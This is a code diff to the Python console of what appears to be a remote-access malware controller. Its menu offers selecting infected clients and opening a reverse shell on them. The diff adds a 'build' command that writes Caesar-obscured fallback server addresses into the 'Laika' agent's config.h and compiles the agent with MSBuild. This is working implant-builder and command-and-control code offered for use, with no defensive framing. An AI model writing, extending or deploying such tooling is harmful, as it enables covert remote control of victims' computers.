@@ -120,6 +120,7 @@ def main() -> None :
             print("select <ID> : sélectionne le client avec lequel intéragir")
             print("deselect : désélectionne le client précédemment séléctionné avec \"select\"")
             print("shell : ouvre un reverse shell dans le client précédemment séléctionné avec \"select\"")
+            print("build : build un client")
             print("")
 
         elif cmd == "exit" :
@@ -129,7 +130,39 @@ def main() -> None :
 
         elif cmd == "clear" :
             ban()
+
+        elif cmd == "build" :
+            print("")
+            nb_fallbacks = input("Nombre de serveurs de fallback : ")
+             
+            if not nb_fallbacks.isdigit() or int(nb_fallbacks) < 0 : 
+                print(f"\"{nb_fallbacks}\" n'est pas un nombre valide.")
+                continue
             
+            ips = []
+            for i in range(1, int(nb_fallbacks)+1) :
+                while True :
+                    s_ip = input(f"IP du serveur {i} : ")
+                    if "." in s_ip : #technique de shlag mais un nom de domaine peut pas être vérifié avec socket du coup on check juste le "."
+                        ips.append(CAESAR(s_ip))
+                        break
+            
+            print("")
+            print("Écriture de la config...")
+            with open("../Laika/config.h", "w") as config :
+                config.write("char* fallback_servers["+nb_fallbacks+"] = {\n")
+                for ip in ips :
+                    config.write(f"\t\"{ip}\",\n")
+                config.write("};")
+            print("Config écrite")
+            
+            print("")
+            print("Compilation de l'agent..")
+            vs_path = os.popen("\"%ProgramFiles(x86)%/Microsoft Visual Studio/Installer/vswhere.exe\" -nologo -latest -property installationPath").read().replace("\n","") #https://stackoverflow.com/questions/46223916/msbuild-exe-not-found-cmd-exe
+            cmd_line = vs_path + "\\Msbuild\\Current\\Bin\\MSBuild.exe"
+
+            os.system("\""+cmd_line+"\" ../Laika /p:Configuration=Release;Platform=x86")
+
         elif cmd == "clients" :
             print("")
             x = PrettyTable()
